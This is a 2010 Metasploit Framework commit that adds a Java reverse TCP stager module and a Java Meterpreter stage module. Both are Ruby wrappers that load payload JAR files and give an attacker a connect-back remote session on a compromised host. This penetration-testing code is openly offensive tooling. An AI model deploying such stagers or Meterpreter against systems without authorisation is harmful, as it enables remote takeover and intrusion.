08d705c1db904f0d5909b77bccbd7a798c5d22de
James Lee <James_Lee@rapid7.com>
2010-07-20 00:53:24 +0000

    add java meterpreter and update java_calendar_deserialize to be able to use it, see #406
    git-svn-id: file:///home/svn/framework3/trunk@9874 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/stagers/java/reverse_tcp.rb
@@ -0,0 +1,54 @@
+##
+# $Id: reverse_tcp.rb 9655 2010-07-01 23:46:05Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'msf/core/payload/php'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
+
+module Metasploit3
+
+	include Msf::Payload::Stager
+	include Msf::Payload::Php
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Java Reverse TCP stager',
+			'Version'       => '$Revision: 9655 $',
+			'Description'   => 'Connect back stager',
+			'Author'        => [
+					'mihi',  # all the hard work
+					'egypt', # msf integration
+				],
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'java',
+			'Arch'          => ARCH_JAVA,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Stager'        => {'Payload' => ""}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		reverse = File.read(File.join(Msf::Config::InstallRoot, 'data', 'java', 'loader.jar'))
+		print_status("Generated loader.jar (#{reverse.length} bytes)")
+
+		return super + reverse
+	end
+
+	def handle_intermediate_stage(conn, payload)
+		conn.put([payload.length].pack("N"))
+	end
+
+end
---
+++ modules/payloads/stages/java/meterpreter.rb
@@ -0,0 +1,44 @@
+##
+# $Id: meterpreter.rb 9655 2010-07-01 23:46:05Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/meterpreter_java'
+require 'msf/base/sessions/meterpreter_options'
+
+
+module Metasploit3
+	include Msf::Sessions::MeterpreterOptions
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'Java Meterpreter',
+			'Version'       => '$Revision: 9655 $',
+			'Description'   => 'Run a meterpreter server in Java',
+			'Author'        => [
+					'mihi', # all the hard work
+					'egypt' # msf integration
+				],
+			'Platform'      => 'java',
+			'Arch'          => ARCH_JAVA,
+			'License'       => MSF_LICENSE,
+			'Session'       => Msf::Sessions::Meterpreter_Java_Java))
+	end
+
+	def generate_stage
+		file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.jar")
+		met = File.open(file, "rb") {|f|
+			f.read(f.stat.size)
+		}
+		met
+	end
+end
+
